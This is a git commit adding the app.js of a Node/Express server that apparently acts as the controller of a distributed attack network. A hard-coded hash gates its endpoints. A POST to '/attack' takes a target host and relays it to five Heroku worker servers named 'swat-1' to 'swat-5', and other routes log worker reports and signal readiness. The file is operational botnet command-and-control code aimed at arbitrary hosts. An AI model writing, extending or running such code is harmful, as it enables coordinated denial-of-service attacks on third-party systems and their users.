5ff44689176a7bea3b26b1c31c4f597da4d2b297
zaincashu <zaincashu@gmail.com>
2018-04-25 21:31:09 +0300

    #1

---
+++ app.js
@@ -0,0 +1,136 @@
+var express = require('express');
+var path = require('path');
+
+var Req = require('request');
+
+var fs = require('fs');
+
+var app = express();
+var run = false;
+var ak = {}
+
+app.use(express.urlencoded({ extended: false }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use(function (req,res,next) {
+  if(!req.query.hash || req.query.hash !== "1111991")
+  {
+    res.status(403);
+    res.end('your are banned');
+    return;
+  }
+
+  next();
+});
+
+
+
+app.post('/attack',function (req,res ) {
+  var host = req.body.host;
+  res.end('done');
+  run = true;
+
+  sendCmd([
+  'https://swat-1.herokuapp.com/',
+  'https://swat-2.herokuapp.com/',
+  'https://swat-3.herokuapp.com/',
+  'https://swat-4.herokuapp.com/',
+  'https://swat-5.herokuapp.com/',
+],host);
+
+
+});
+
+app.post('/reg',function (req,res) {
+  res.end('saved');
+  var txt = req.body.s;
+  var id = req.body.id;
+  delete ak[id];
+  save(txt);
+});
+
+
+app.head('/',function (req,res) {
+  res.writeHead(200,
+    {'type': 'swat',
+    'ready': !run
+  });
+  res.end();
+});
+
+function save(txt) {
+  var date = getNow();
+  date = new Date(date).toTimeString();
+
+  fs.appendFile('log.txt', '\n'+date+'  ::'+txt, function (err) {
+  if (err) throw err;
+  console.log('Updated!');
+  if (ak.length == 0) {
+    run = false;
+  }
+});
+
+
+}
+
+app.get('/', function (req,res) {
+  res.sendFile(__dirname+'/log.txt');
+});
+
+app.use(function (req,res) {
+  res.status(404);
+  res.end('Not Found');
+});
+
+function sendCmd(servers,host) {
+var s = 0;
+var e = servers.length;
+var limit = 5;
+
+var onSucess = function (err,rr,body) {
+  if (err)
+  {
+    console.log(err);
+    return;
+  }
+    s++;
+    ak[s] = true;
+    console.log('cmd '+ s +' success');
+    console.log(body);
+    if (s >= e)
+    {
+
+    }
+    else send();
+
+
+}
+
+var send = function () {
+  var pin = '1111991';
+  var url = servers[s] + 'attack/?hash='+pin;
+  console.log(url);
+  Req.post({
+    url:url,
+    form:{
+      host:host,
+      limit:limit,
+      id:s+1,
+    }
+  },onSucess);
+}
+
+send();
+
+
+
+
+}
+
+function getNow() {
+  var iraq = new Date().getTime();
+  return iraq;
+}
+
+console.log('now :'+getNow());
+module.exports = app;
